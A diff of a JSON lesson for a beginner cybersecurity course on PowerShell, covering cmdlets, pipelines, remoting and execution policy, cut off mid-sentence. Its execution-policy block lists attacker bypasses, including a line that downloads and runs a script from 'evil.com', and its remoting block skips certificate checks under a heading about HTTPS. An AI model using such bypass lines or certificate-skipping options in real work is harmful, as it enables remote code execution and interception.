@@ -1,148 +1,274 @@
 {
   "lesson_id": "b41fcbad-0d3d-4a3c-83d1-65c963f4bf58",
   "domain": "fundamentals",
-  "title": "PowerShell Foundations for Cyber Practitioners",
-  "subtitle": "Cmdlets, objects, and automation habits for Windows environments",
+  "title": "PowerShell Mastery for Cybersecurity Professionals",
+  "subtitle": "From cmdlets to automation - Building your security toolkit with PowerShell",
   "difficulty": 1,
-  "estimated_time": 45,
+  "estimated_time": 60,
   "order_index": 12,
-  "prerequisites": [
-    "Cybersecurity Orientation & Learning Gameplan",
-    "Active Directory Fundamentals"
-  ],
+  "prerequisites": [],
   "concepts": [
-    "PowerShell vs traditional shells",
-    "Cmdlets and parameter binding",
-    "Object pipeline fundamentals",
-    "Providers and PSDrives",
-    "Remoting safety basics",
-    "Execution policy management",
-    "Modules and the PowerShell Gallery",
-    "Scripting hygiene and logging",
-    "Error handling with Try/Catch",
-    "Help system and community resources"
+    "PowerShell architecture and .NET integration",
+    "Cmdlet syntax and verb-noun naming",
+    "Object pipeline vs text-based shells",
+    "Get-Help and discoverability system",
+    "Filtering with Where-Object and Select-Object",
+    "PowerShell remoting and security",
+    "Execution policy and script signing",
+    "PowerShell providers and PSDrives",
+    "Module system and PowerShell Gallery",
+    "Event logging and transcription",
+    "Error handling with Try-Catch-Finally",
+    "Security-focused scripting patterns"
   ],
   "learning_objectives": [
-    "Describe how PowerShell differs from CMD/Bash and why it returns .NET objects",
-    "Use `Get-Help`, `Get-Command`, and `Get-Member` to explore cmdlets safely",
-    "Build pipelines that filter, sort, and export structured data",
-    "Configure execution policy responsibly and explain script signing options",
-    "Establish PowerShell remoting with least privilege and session transcripts",
-    "Document scripts with comments, transcripts, and version control"
+    "Explain why PowerShell's object-based pipeline is superior for security automation",
+    "Use Get-Help, Get-Command, and Get-Member to discover cmdlet capabilities",
+    "Build PowerShell one-liners to query processes, services, and event logs",
+    "Configure PowerShell remoting securely with session transcripts enabled",
+    "Write defensive scripts with proper error handling and logging",
+    "Understand execution policy vs real security controls",
+    "Leverage PowerShell for incident response and security investigations"
   ],
   "content_blocks": [
     {
-      "block_id": "f0b5f3ed-2c7c-4b3a-b08d-2ab5f1f0610f",
+      "block_id": "intro-mindset",
       "type": "mindset_coach",
-      "title": "Think in Objects",
+      "title": "Think Like a Security Automation Engineer",
       "content": {
-        "text": "PowerShell rewards curiosity. Treat every command as an opportunity to shape objects instead of parsing text. Ask: *What object am I working with and how can I view it safely?*"
+        "text": "**Welcome to PowerShell - Your Security Superpower**\n\nIf you're entering cybersecurity, PowerShell is your force multiplier. Whether you're hunting threats, responding to incidents, or hardening systems, PowerShell lets you automate what would take hours of clicking.\n\n**The Growth Mindset for PowerShell:**\n- **Curiosity over memorization**: You don't need to memorize every cmdlet. Learn to discover commands using Get-Help and Get-Command.\n- **Objects are your friends**: Unlike Bash or CMD, PowerShell passes rich objects through the pipeline. This means less text parsing, more power.\n- **Fail fast in the lab**: Always test in a lab environment first. PowerShell is powerful enough to break production systems.\n- **Build your toolkit incrementally**: Start with simple one-liners, then graduate to scripts, then modules.\n\n**Jim Kwik Principle - Reframe Limiting Beliefs:**\nDon't think \"I'm not a programmer.\" Think \"I'm learning to automate security tasks.\" PowerShell's English-like syntax makes it accessible to anyone willing to practice.\n\n**Remember**: Every security expert started exactly where you are. The difference is they practiced consistently."
       },
-      "simplified_explanation": "PowerShell works with objects—explore before you execute.",
+      "simplified_explanation": "PowerShell is your automation superpower. Learn to discover, not memorize. Test safely, build incrementally.",
       "memory_aids": [
-        "Objects over text",
-        "Explore, then act"
+        "Discover > Memorize",
+        "Objects > Text",
+        "Lab > Production"
       ],
-      "real_world_connection": "SOC analysts lean on PowerShell to inventory hosts, collect logs, and respond to incidents. Mastering the basics prevents costly mistakes later.",
-      "reflection_prompt": "Which Windows task would be easier if you could query structured objects instead of scraping text?",
-      "is_interactive": false,
-      "xp_reward": 0
-    },
-    {
-      "block_id": "0ff1eaeb-ffae-467d-bae6-94fd839fe4cb",
-      "type": "explanation",
-      "title": "POWERS Habit",
-      "content": {
-        "text": "### POWERS\n- **P**ipeline objects, not strings\n- **O**bserve with `Get-Help` and `Get-Member`\n- **W**ork via providers (FileSystem, Registry)\n- **E**xecution policy awareness\n- **R**emoting with just-enough rights\n- **S**cripts documented and versioned"
-      },
-      "simplified_explanation": "Follow POWERS every session to stay safe and productive.",
-      "memory_aids": [
-        "POWERS"
-      ],
-      "real_world_connection": "Teams that adopt POWERS reduce incidents caused by unsafe scripts or over-privileged remoting.",
-      "reflection_prompt": "Which POWERS habit do you already follow, and which will you practise this week?",
-      "is_interactive": false,
-      "xp_reward": 10
-    },
-    {
-      "block_id": "1bf23a04-7dbe-4bc1-b9f0-5f75af4fd4b2",
-      "type": "video",
-      "title": "PowerShell for Beginners in 90 Minutes",
-      "content": {
-        "resources": "Watch the friendly introduction and mimic each demo in your lab.\n\n**Video**: [PowerShell Scripting - Getting Started in 2025 for Cybersecurity Beginners](https://www.youtube.com/watch?v=wiAlgfm8krE)\n\nThe session highlights cmdlets, the object pipeline, and remoting safety tips from Microsoft MVPs."
-      },
-      "simplified_explanation": "Visual demos cement syntax—pause frequently to practise commands yourself.",
-      "memory_aids": [
-        "Pause, type, review"
-      ],
-      "real_world_connection": "This workshop mirrors many enterprise onboarding bootcamps for junior analysts.",
-      "reflection_prompt": "Which demo from the video will you recreate immediately?",
-      "is_interactive": false,
-      "xp_reward": 10
-    },
-    {
-      "block_id": "4a3c17fb-9aef-496c-a3cf-8858f16c2062",
-      "type": "memory_aid",
-      "title": "Discovery Cmdlets Cheat Sheet",
-      "content": {
-        "text": "- Explore: `Get-Command`, `Get-Help`, `Get-Member`\n- Filesystem: `Get-ChildItem`, `Test-Path`, `Copy-Item`\n- Processes & Services: `Get-Process`, `Get-Service`, `Stop-Process`\n- Filter & Format: `Where-Object`, `Select-Object`, `Format-Table`, `Export-Csv`"
-      },
-      "simplified_explanation": "Start with discovery commands before altering anything.",
-      "memory_aids": [
-        "Discover → Filter → Act"
-      ],
-      "real_world_connection": "Incident responders use these cmdlets to triage systems quickly and safely.",
-      "reflection_prompt": "Which discovery cmdlet will you add to your daily workflow?",
+      "real_world_connection": "SOC analysts use PowerShell daily to query logs, collect forensic data, and respond to incidents across thousands of endpoints.",
+      "reflection_prompt": "What repetitive security task would you most like to automate with PowerShell?",
       "is_interactive": false,
       "xp_reward": 5
     },
     {
-      "block_id": "e223b66c-4973-4aeb-a154-6a3eddacdd90",
-      "type": "real_world",
-      "title": "Field Example: SOC Onboarding",
+      "block_id": "what-is-powershell",
+      "type": "explanation",
+      "title": "What Makes PowerShell Different: The Object Pipeline",
       "content": {
-        "text": "A financial SOC halved analyst onboarding time by giving new hires a PowerShell foundations lab and the POWERS checklist. Analysts now pull host inventories and export logs with reusable scripts instead of manual clicks."
+        "text": "### PowerShell: Not Your Father's Command Line\n\nPowerShell is a task automation framework built on the .NET runtime. Released in 2006, it's now the primary automation tool for Windows and increasingly popular on Linux and macOS (via PowerShell Core/7+).\n\n**Key Architectural Differences:**\n\n**1. Object-Based Pipeline (Not Text)**\n\nTraditional shells like Bash output text:\n```bash\n# Bash - outputs text, requires parsing\nps aux | grep apache | awk '{print $2}'\n```\n\nPowerShell outputs objects:\n```powershell\n# PowerShell - outputs objects with properties\nGet-Process | Where-Object {$_.Name -like '*apache*'} | Select-Object Id, CPU\n```\n\nWhen you pipe data in PowerShell, you're passing **structured .NET objects** with properties and methods, not strings. This means:\n- No text parsing with grep/awk/sed\n- Access to properties directly: `$process.Id`, `$process.CPU`\n- Built-in formatting: `Format-Table`, `Format-List`, `Export-Csv`\n\n**2. Verb-Noun Cmdlet Naming**\n\nEvery cmdlet follows the format: `Verb-Noun`\n- `Get-Process` - retrieves processes\n- `Stop-Service` - stops a service\n- `Test-Connection` - tests network connectivity\n- `Set-ExecutionPolicy` - configures execution policy\n\nCommon verbs: Get, Set, New, Remove, Start, Stop, Test, Invoke\n\nThis consistency makes PowerShell highly discoverable.\n\n**3. Built-in Help System**\n\nEvery cmdlet has built-in documentation:\n```powershell\nGet-Help Get-Process\nGet-Help Get-Process -Examples\nGet-Help Get-Process -Full\nGet-Help Get-Process -Online  # Opens web documentation\n```\n\n**4. Aliases for Familiarity**\n\nPowerShell includes aliases that mimic Bash/CMD:\n- `ls` → `Get-ChildItem`\n- `dir` → `Get-ChildItem`\n- `cat` → `Get-Content`\n- `ps` → `Get-Process`\n- `kill` → `Stop-Process`\n\nBut remember: these are just aliases. The underlying cmdlets work with objects.\n\n**Why This Matters for Security:**\n\nSecurity tasks often involve:\n- Querying event logs across multiple servers\n- Collecting process information for threat hunting\n- Automating incident response playbooks\n- Extracting forensic artifacts\n\nPowerShell's object pipeline makes these tasks dramatically easier than text-based shells."
       },
-      "simplified_explanation": "A small investment in PowerShell basics yields big operational gains.",
+      "simplified_explanation": "PowerShell passes objects (not text) through pipes, uses Verb-Noun naming, and has built-in help. This makes security automation much easier.",
       "memory_aids": [
-        "Automate the tedious"
+        "Objects > Text = Less Parsing",
+        "Verb-Noun = Discoverable",
+        "Get-Help = Your Best Friend"
       ],
-      "real_world_connection": "Organisations track productivity improvements when analysts master essential cmdlets.",
-      "reflection_prompt": "Which repetitive Windows task will you automate first?",
+      "real_world_connection": "Microsoft's internal security team processes millions of security events daily using PowerShell automation.",
+      "reflection_prompt": "Think of a security task you do manually. How might PowerShell's object pipeline make it easier?",
       "is_interactive": false,
       "xp_reward": 10
     },
     {
-      "block_id": "3086072d-0f5f-4813-907f-1a5028ee9b00",
-      "type": "simulation",
-      "title": "Guided Lab: Build Your First Toolkit",
+      "block_id": "discovery-trinity",
+      "type": "explanation",
+      "title": "The Discovery Trinity: Your PowerShell Compass",
       "content": {
-        "text": "1. Launch PowerShell and explore with `Get-Help`, `Get-Command`, and `Get-Member`.\n2. Write a script that lists services, filters for those stopped, and exports to CSV.\n3. Set execution policy to `RemoteSigned` temporarily, note why, then revert.\n4. Open a lab remoting session using a least-privileged account and run your script.\n5. Enable transcription, review the log, and commit the script with comments to version control."
+        "text": "### The Three Commands You'll Use Every Day\n\nPowerShell is designed for discoverability. You don't need to memorize everything - you need to master three commands:\n\n**1. Get-Command: Find Cmdlets**\n\nSearch for commands by verb, noun, or keyword:\n```powershell\n# Find all commands that get things\nGet-Command -Verb Get\n\n# Find all commands related to processes\nGet-Command -Noun Process\n\n# Find commands with 'event' in the name\nGet-Command *event*\n\n# Find commands in a specific module\nGet-Command -Module Microsoft.PowerShell.Security\n\n# Count available commands\n(Get-Command).Count\n```\n\n**Example Output:**\n```\nCommandType     Name                                               Version    Source\n-----------     ----                                               -------    ------\nCmdlet          Get-Process                                        7.0.0.0    Microsoft.PowerShell.Management\nCmdlet          Stop-Process                                       7.0.0.0    Microsoft.PowerShell.Management\nCmdlet          Wait-Process                                       7.0.0.0    Microsoft.PowerShell.Management\n```\n\n**2. Get-Help: Learn What a Command Does**\n\nGet detailed information about any command:\n```powershell\n# Quick help\nGet-Help Get-EventLog\n\n# See examples (MOST USEFUL)\nGet-Help Get-EventLog -Examples\n\n# See detailed parameter info\nGet-Help Get-EventLog -Detailed\n\n# See full technical documentation\nGet-Help Get-EventLog -Full\n\n# Open online documentation in browser\nGet-Help Get-EventLog -Online\n\n# Update help files (run periodically)\nUpdate-Help -Force\n```\n\n**Pro Tip:** Always start with `-Examples`. This shows you practical usage patterns.\n\n**3. Get-Member: Inspect Object Properties and Methods**\n\nSee what properties and methods an object has:\n```powershell\n# What properties does a process object have?\nGet-Process | Get-Member\n\n# Filter to see only properties\nGet-Process | Get-Member -MemberType Property\n\n# Filter to see only methods\nGet-Process | Get-Member -MemberType Method\n\n# See what type of object you're working with\nGet-Service | Get-Member | Select-Object -First 1\n```\n\n**Example Output:**\n```\n   TypeName: System.Diagnostics.Process\n\nName                       MemberType     Definition\n----                       ----------     ----------\nHandles                    AliasProperty  Handles = Handlecount\nCPU                        Property       double CPU {get;}\nId                         Property       int Id {get;}\nProcessName                Property       string ProcessName {get;}\nKill                       Method         void Kill()\nWaitForExit                Method         bool WaitForExit(int milliseconds)\n```\n\nNow you know a Process object has properties like `Id`, `ProcessName`, and `CPU`, plus methods like `Kill()`.\n\n**The Discovery Pattern:**\n```powershell\n# 1. Find relevant commands\nGet-Command *log*\n\n# 2. Learn about a specific command\nGet-Help Get-EventLog -Examples\n\n# 3. Run the command and inspect output\nGet-EventLog -LogName Security -Newest 10 | Get-Member\n\n# 4. Select specific properties you need\nGet-EventLog -LogName Security -Newest 10 | Select-Object TimeGenerated, EventID, Message\n```\n\n**Memory Aid - GGG Pattern:**\n- **G**et-Command → Find it\n- **G**et-Help → Learn it\n- **G**et-Member → Inspect it"
       },
-      "simplified_explanation": "Practise discovery, scripting, safety, and documentation end-to-end in a lab.",
+      "simplified_explanation": "Master Get-Command (find cmdlets), Get-Help (learn usage), and Get-Member (inspect objects). These three commands unlock all of PowerShell.",
       "memory_aids": [
-        "Discover → Script → Secure"
+        "GGG: Get-Command, Get-Help, Get-Member",
+        "Find it → Learn it → Inspect it",
+        "Get-Help -Examples is your best friend"
       ],
-      "real_world_connection": "This mirrors the workflow analysts follow when triaging endpoints remotely.",
-      "reflection_prompt": "What hurdles did you encounter during the lab, and how will you overcome them next time?",
+      "real_world_connection": "Security analysts don't memorize cmdlets - they use the discovery trinity to explore as they work.",
+      "reflection_prompt": "Pick any verb (Get, Set, Stop, etc.). Use Get-Command to find 5 cmdlets with that verb. What did you discover?",
+      "is_interactive": false,
+      "xp_reward": 15
+    },
+    {
+      "block_id": "video-resource",
+      "type": "video",
+      "title": "PowerShell Foundations Video Guide",
+      "content": {
+        "resources": "Watch this comprehensive introduction to PowerShell fundamentals:\n\n**Video**: [PowerShell Scripting - Getting Started in 2025 for Cybersecurity Beginners](https://www.youtube.com/watch?v=wiAlgfm8krE)\n\n**What You'll Learn:**\n- PowerShell console vs ISE vs VS Code\n- Running your first commands\n- Understanding the object pipeline\n- Working with cmdlets and parameters\n- Practical security examples\n\n**Active Learning Strategy:**\n1. Watch the first 15 minutes straight through\n2. Pause and recreate each example in your own PowerShell window\n3. Experiment by changing parameters\n4. Use Get-Help to explore commands shown in the video\n5. Take notes on concepts you want to revisit\n\n**Jim Kwik Principle - Active Learning:**\nDon't just watch passively. Type every command yourself. Experiment with variations. This builds muscle memory and deepens understanding."
+      },
+      "simplified_explanation": "Watch and practice along with the video. Type every command yourself to build muscle memory.",
+      "memory_aids": [
+        "Watch → Pause → Type → Experiment",
+        "Active learning beats passive watching"
+      ],
+      "real_world_connection": "Hands-on practice is how professional security engineers learned PowerShell. Labs beat lectures every time.",
+      "reflection_prompt": "After watching, which concept seemed most useful for your security goals?",
+      "is_interactive": false,
+      "xp_reward": 10
+    },
+    {
+      "block_id": "pipeline-mastery",
+      "type": "explanation",
+      "title": "Pipeline Mastery: Chaining Commands Like a Pro",
+      "content": {
+        "text": "### The Pipeline: PowerShell's Secret Weapon\n\nThe pipeline (`|`) passes objects from one command to the next. This is where PowerShell becomes incredibly powerful.\n\n**Basic Pipeline Pattern:**\n```powershell\nGet-Something | Filter-Something | Format-Something | Export-Something\n```\n\n**Essential Pipeline Cmdlets:**\n\n**1. Where-Object: Filter Objects**\n\nFilter objects based on properties:\n```powershell\n# Get processes using more than 100MB of memory\nGet-Process | Where-Object {$_.WorkingSet -gt 100MB}\n\n# Get stopped services\nGet-Service | Where-Object {$_.Status -eq 'Stopped'}\n\n# Get Security event log entries from last hour\nGet-EventLog -LogName Security -Newest 1000 | \n    Where-Object {$_.TimeGenerated -gt (Get-Date).AddHours(-1)}\n\n# Multiple conditions with -and / -or\nGet-Process | Where-Object {$_.CPU -gt 10 -and $_.WorkingSet -gt 50MB}\n```\n\n**Shortened syntax (PowerShell 3.0+):**\n```powershell\nGet-Process | Where WorkingSet -gt 100MB\nGet-Service | Where Status -eq 'Stopped'\n```\n\n**2. Select-Object: Choose Properties**\n\nPick which properties to display:\n```powershell\n# Select specific properties\nGet-Process | Select-Object Name, Id, CPU, WorkingSet\n\n# Get first 10 results\nGet-Process | Select-Object -First 10\n\n# Get last 5 results\nGet-EventLog -LogName System -Newest 100 | Select-Object -Last 5\n\n# Calculate new properties\nGet-Process | Select-Object Name, @{Name='MemoryMB';Expression={$_.WorkingSet / 1MB}}\n\n# Unique values only\nGet-Process | Select-Object ProcessName -Unique\n```\n\n**3. Sort-Object: Order Results**\n\n```powershell\n# Sort by CPU usage (ascending)\nGet-Process | Sort-Object CPU\n\n# Sort by memory (descending) - most memory first\nGet-Process | Sort-Object WorkingSet -Descending\n\n# Sort by multiple properties\nGet-Service | Sort-Object Status, DisplayName\n```\n\n**4. Format Commands: Display Nicely**\n\n```powershell\n# Format as table (default for many cmdlets)\nGet-Process | Format-Table Name, Id, CPU -AutoSize\n\n# Format as list (good for many properties)\nGet-Process -Name powershell | Format-List *\n\n# Format as wide list\nGet-Process | Format-Wide Name -Column 4\n```\n\n**IMPORTANT**: Format commands are for **display only**. Once you format, you can't pipe to other commands. Always format **last** in the pipeline.\n\n**5. Export Commands: Save Results**\n\n```powershell\n# Export to CSV\nGet-Process | Export-Csv -Path processes.csv -NoTypeInformation\n\n# Export to JSON\nGet-Service | ConvertTo-Json | Out-File services.json\n\n# Export to HTML report\nGet-EventLog -LogName Security -Newest 100 | \n    ConvertTo-Html -Property TimeGenerated, EventID, Message | \n    Out-File SecurityEvents.html\n\n# Export to XML\nGet-Process | Export-Clixml processes.xml\n```\n\n**Security Use Case Examples:**\n\n**Find Suspicious Processes:**\n```powershell\n# Processes without a company name (potentially unsigned)\nGet-Process | Where-Object {$_.Company -eq $null} | \n    Select-Object Name, Path, Id |\n    Export-Csv suspicious_processes.csv -NoTypeInformation\n```\n\n**Audit Failed Logon Attempts:**\n```powershell\n# Event ID 4625 = Failed logon\nGet-EventLog -LogName Security -Newest 1000 | \n    Where-Object {$_.EventID -eq 4625} |\n    Select-Object TimeGenerated, Message |\n    Format-Table -AutoSize\n```\n\n**Find Services Running as System:**\n```powershell\nGet-WmiObject Win32_Service | \n    Where-Object {$_.StartName -like '*System*'} |\n    Select-Object Name, State, StartName, PathName |\n    Export-Csv system_services.csv -NoTypeInformation\n```\n\n**Pipeline Memory Technique - WSFE:**\n- **W**here-Object → Filter\n- **S**elect-Object → Choose properties\n- **F**ormat / Sort → Display\n- **E**xport → Save"
+      },
+      "simplified_explanation": "Pipeline commands together: Get data → Filter → Select properties → Sort → Format/Export. Always format last.",
+      "memory_aids": [
+        "WSFE: Where, Select, Format, Export",
+        "Format commands break the pipeline - always last!",
+        "Where = Filter, Select = Pick columns"
+      ],
+      "real_world_connection": "SOC analysts build pipelines to extract security events, filter for IOCs, and export evidence for investigations.",
+      "reflection_prompt": "Build a pipeline to find the top 5 processes by CPU usage and export to CSV. What did you learn?",
+      "is_interactive": false,
+      "xp_reward": 20
+    },
+    {
+      "block_id": "code-exercises",
+      "type": "code_exercise",
+      "title": "Hands-On Pipeline Exercises",
+      "content": {
+        "text": "## Practice Makes Permanent\n\nType these exercises in your PowerShell window. Don't copy-paste - typing builds muscle memory.\n\n**Exercise 1: Process Investigation**\n```powershell\n# Find all processes using more than 200MB RAM\nGet-Process | Where-Object {$_.WorkingSet -gt 200MB} | \n    Select-Object Name, Id, @{N='MemoryMB';E={[math]::Round($_.WorkingSet/1MB,2)}} |\n    Sort-Object MemoryMB -Descending\n```\n\n**Exercise 2: Service Audit**\n```powershell\n# Find all stopped services that are set to automatic start\nGet-Service | Where-Object {$_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'} |\n    Select-Object DisplayName, Status, StartType |\n    Export-Csv stopped_auto_services.csv -NoTypeInformation\n```\n\n**Exercise 3: Network Connection Analysis**\n```powershell\n# Find established network connections (requires admin)\nGet-NetTCPConnection -State Established |\n    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State |\n    Sort-Object RemoteAddress |\n    Format-Table -AutoSize\n```\n\n**Exercise 4: Security Event Log Query**\n```powershell\n# Find recent Security log events (Event ID 4624 = Successful logon)\nGet-EventLog -LogName Security -Newest 500 |\n    Where-Object {$_.EventID -eq 4624} |\n    Select-Object TimeGenerated, EventID, Message -First 10 |\n    Format-List\n```\n\n**Exercise 5: File System Hunt**\n```powershell\n# Find executable files modified in last 7 days (potential malware indicator)\nGet-ChildItem -Path C:\\Users\\$env:USERNAME\\Downloads -Recurse -Include *.exe,*.dll -ErrorAction SilentlyContinue |\n    Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |\n    Select-Object Name, Length, LastWriteTime, FullName |\n    Export-Csv recent_executables.csv -NoTypeInformation\n```\n\n**Challenge Exercise: Threat Hunting One-Liner**\n\nCombine concepts to find suspicious processes:\n```powershell\n# Find processes with network connections but no digital signature\nGet-Process | Where-Object {$_.Company -eq $null} |\n    ForEach-Object {\n        $proc = $_\n        $conns = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue\n        if ($conns) {\n            [PSCustomObject]@{\n                ProcessName = $proc.Name\n                PID = $proc.Id\n                Path = $proc.Path\n                Connections = $conns.Count\n            }\n        }\n    } | Export-Csv unsigned_with_network.csv -NoTypeInformation\n```\n\n**Reflection Questions:**\n- Which exercise was most challenging? Why?\n- How could you modify these for your specific environment?\n- What security questions could you answer with pipelines?"
+      },
+      "simplified_explanation": "Practice building pipelines with real security scenarios. Type each command yourself to build muscle memory.",
+      "memory_aids": [
+        "Type don't copy = Muscle memory",
+        "Every exercise teaches a pattern",
+        "Modify and experiment"
+      ],
+      "real_world_connection": "These are actual patterns used by security analysts during incident investigations and threat hunting.",
+      "reflection_prompt": "Which exercise pattern would be most useful in your current role or lab environment?",
       "is_interactive": true,
+      "xp_reward": 30
+    },
+    {
+      "block_id": "remoting-security",
+      "type": "explanation",
+      "title": "PowerShell Remoting: Secure Remote Management",
+      "content": {
+        "text": "### PowerShell Remoting: Your Remote Security Toolkit\n\nPowerShell Remoting lets you run commands on remote computers - essential for managing enterprise environments and responding to incidents.\n\n**How It Works:**\n\nPowerShell Remoting uses WS-Management protocol (WinRM) over HTTP/HTTPS:\n- Default ports: 5985 (HTTP), 5986 (HTTPS)\n- Authentication: Kerberos (domain), NTLM, or certificates\n- Encryption: All traffic is encrypted by default\n- Based on WS-Management standard (not SSH by default on Windows)\n\n**Enabling PowerShell Remoting:**\n\n```powershell\n# On the remote computer (requires admin)\nEnable-PSRemoting -Force\n\n# Check status\nGet-PSSessionConfiguration\n\n# Test connectivity from client\nTest-WSMan -ComputerName SERVER01\n```\n\n**One-to-One Remoting:**\n\n```powershell\n# Interactive session (like SSH)\nEnter-PSSession -ComputerName SERVER01\n\n# Your prompt changes to [SERVER01]:\nPS [SERVER01]> Get-Process\nPS [SERVER01]> Exit-PSSession\n\n# With specific credentials\n$cred = Get-Credential\nEnter-PSSession -ComputerName SERVER01 -Credential $cred\n```\n\n**One-to-Many Remoting:**\n\n```powershell\n# Run command on multiple computers\nInvoke-Command -ComputerName SERVER01,SERVER02,SERVER03 -ScriptBlock {\n    Get-Process | Where-Object {$_.CPU -gt 100}\n}\n\n# Results include ComputerName property\nInvoke-Command -ComputerName (Get-Content servers.txt) -ScriptBlock {\n    Get-EventLog -LogName Security -Newest 10\n} | Select-Object PSComputerName, TimeGenerated, EventID\n\n# Run a local script remotely\nInvoke-Command -ComputerName SERVER01 -FilePath C:\\Scripts\\Audit.ps1\n```\n\n**Persistent Sessions:**\n\n```powershell\n# Create reusable sessions\n$sessions = New-PSSession -ComputerName SERVER01,SERVER02,SERVER03\n\n# Run commands using existing sessions (faster)\nInvoke-Command -Session $sessions -ScriptBlock {\n    Get-Service | Where-Object {$_.Status -eq 'Stopped'}\n}\n\n# Close sessions when done\nRemove-PSSession $sessions\n```\n\n**Security Considerations:**\n\n**1. Least Privilege:**\n```powershell\n# Use JEA (Just Enough Administration) endpoints\n# Create constrained endpoints that limit what users can do\n\n# Example: Endpoint that only allows Get commands\nRegister-PSSessionConfiguration -Name ReadOnly -StartupScript C:\\Scripts\\ReadOnlyEndpoint.ps1\n\n# Users connect to restricted endpoint\nEnter-PSSession -ComputerName SERVER01 -ConfigurationName ReadOnly\n```\n\n**2. Session Transcription (Audit Everything):**\n```powershell\n# Enable transcription via Group Policy or:\nStart-Transcript -Path \"C:\\Logs\\PSTranscript_$(Get-Date -Format yyyyMMdd_HHmmss).txt\"\n\n# ... do your work ...\n\nStop-Transcript\n```\n\n**3. Credential Management:**\n```powershell\n# NEVER hardcode passwords!\n# BAD:\n$password = ConvertTo-SecureString \"MyPassword123\" -AsPlainText -Force\n\n# GOOD: Prompt user\n$cred = Get-Credential\n\n# BETTER: Use credential manager or Azure Key Vault\n$cred = Get-StoredCredential -Target \"ServerAdmin\"\n```\n\n**4. Use HTTPS for Sensitive Environments:**\n```powershell\n# Create session over HTTPS (requires certificate)\n$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck\nEnter-PSSession -ComputerName SERVER01 -UseSSL -SessionOption $sessionOption\n```\n\n**Incident Response Scenario:**\n\n```powershell\n# Respond to ransomware alert: Collect evidence from multiple endpoints\n$targets = \"WS01\",\"WS02\",\"WS03\"\n\nInvoke-Command -ComputerName $targets -ScriptBlock {\n    # Collect process list\n    $processes = Get-Process | Select-Object Name, Id, Path, Company, StartTime\n    \n    # Collect network connections\n    $connections = Get-NetTCPConnection -State Established | Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess\n    \n    # Collect recent file modifications\n    $files = Get-ChildItem C:\\Users -Recurse -ErrorAction SilentlyContinue |\n        Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-2)} |\n        Select-Object FullName, LastWriteTime, Length -First 100\n    \n    # Return as object\n    [PSCustomObject]@{\n        Hostname = $env:COMPUTERNAME\n        Processes = $processes\n        Connections = $connections\n        RecentFiles = $files\n        CollectionTime = Get-Date\n    }\n} | Export-Clixml IncidentData_$(Get-Date -Format yyyyMMdd_HHmmss).xml\n```\n\n**Key Takeaways:**\n- Remoting is encrypted by default\n- Always use least privilege (JEA)\n- Enable transcription for auditability\n- Use persistent sessions for efficiency\n- Never hardcode credentials"
+      },
+      "simplified_explanation": "PowerShell Remoting lets you run commands on remote systems securely. Use Invoke-Command for one-to-many execution, enable transcription, and follow least privilege.",
+      "memory_aids": [
+        "Enter-PSSession = Interactive (1-to-1)",
+        "Invoke-Command = Batch (1-to-many)",
+        "Always transcribe, never hardcode creds",
+        "JEA = Just Enough Administration"
+      ],
+      "real_world_connection": "During the 2017 NotPetya ransomware outbreak, incident responders used PowerShell Remoting to query thousands of endpoints simultaneously for IOCs.",
+      "reflection_prompt": "In an incident response scenario, what data would you collect from endpoints using PowerShell Remoting?",
+      "is_interactive": false,
       "xp_reward": 25
     },
     {
-      "block_id": "79452cfc-17ed-4e4b-a4d6-ff4aa2f9b0ca",
-      "type": "reflection",
-      "title": "Teach Back",
+      "block_id": "execution-policy",
+      "type": "explanation",
+      "title": "Execution Policy: Understanding the Guardrails",
       "content": {
-        "text": "### Teach Back\n- Explain the POWERS mnemonic to a teammate.\n- Share your service inventory script, highlighting safety measures.\n- Schedule a follow-up in 2 weeks to discuss what you automated next."
+        "text": "### Execution Policy: Not a Security Boundary\n\n**IMPORTANT**: Execution Policy is **NOT** a security control. It's a safety feature to prevent accidental script execution.\n\n**What Execution Policy Does:**\n- Prevents accidental execution of unsigned scripts\n- Helps prevent users from unknowingly running malicious scripts\n- Can be bypassed trivially by attackers\n\n**What Execution Policy Does NOT Do:**\n- It does NOT prevent determined attackers from running malicious code\n- It does NOT validate script integrity\n- It is NOT a replacement for AppLocker, WDAC, or antivirus\n\n**Execution Policy Levels:**\n\n```powershell\n# Check current execution policy\nGet-ExecutionPolicy\n\n# Check effective policy from all scopes\nGet-ExecutionPolicy -List\n```\n\n**Policy Levels (Most Restrictive to Least):**\n\n1. **Restricted** (Default on Windows Client)\n   - No scripts allowed, only interactive commands\n   - Safest for users who don't need automation\n\n2. **AllSigned**\n   - Only scripts signed by trusted publisher\n   - Requires code signing infrastructure\n   - Recommended for production environments\n\n3. **RemoteSigned** (Default on Windows Server)\n   - Locally created scripts can run unsigned\n   - Downloaded scripts must be signed\n   - Good balance for most organizations\n\n4. **Unrestricted**\n   - All scripts can run, but warns on downloaded scripts\n   - Not recommended\n\n5. **Bypass**\n   - No restrictions, no warnings\n   - Used for automation scenarios\n   - Should be used sparingly\n\n**Setting Execution Policy:**\n\n```powershell\n# Set for current user only (no admin required)\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned\n\n# Set system-wide (requires admin)\nSet-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned\n\n# Temporary bypass for a single script (current session only)\nPowerShell.exe -ExecutionPolicy Bypass -File .\\script.ps1\n\n# View all scopes\nGet-ExecutionPolicy -List\n```\n\n**Scope Precedence (Highest to Lowest):**\n1. MachinePolicy (Group Policy - Computer)\n2. UserPolicy (Group Policy - User)\n3. Process (Current PowerShell session)\n4. CurrentUser (HKCU registry)\n5. LocalMachine (HKLM registry)\n\n**How Attackers Bypass Execution Policy:**\n\n```powershell\n# Method 1: Read and pipe to PowerShell\nGet-Content .\\malicious.ps1 | PowerShell.exe -NoProfile -\n\n# Method 2: Download and execute in memory\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\n\n# Method 3: Encode the script\n$command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))\nPowerShell.exe -EncodedCommand $command\n\n# Method 4: Use -ExecutionPolicy Bypass flag\nPowerShell.exe -ExecutionPolicy Bypass -File .\\script.ps1\n```\n\n**Real Security Controls:**\n\nIf you need actual security, use these 